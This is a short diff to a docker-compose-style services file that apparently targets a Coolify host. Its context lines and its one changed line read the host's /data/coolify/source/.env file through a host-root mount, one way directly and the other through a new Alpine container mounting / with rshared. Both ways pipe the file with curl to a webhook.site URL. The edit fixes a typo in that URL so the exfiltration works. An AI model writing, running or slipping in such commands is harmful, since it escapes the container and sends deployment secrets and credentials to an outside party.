@@ -20,4 +20,4 @@ services:
         cat /host-root/data/coolify/source/.env 2>/dev/null | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=direct_env
         
         # Альтернатива: запустить новый контейнер с rshared
-        docker run --rm -v /:/host:rshared alpine:3.19 cat /host/data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212eL?stage=via_docker_rshared
+        docker run --rm -v /:/host:rshared alpine:3.19 cat /host/data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=via_docker_rshared
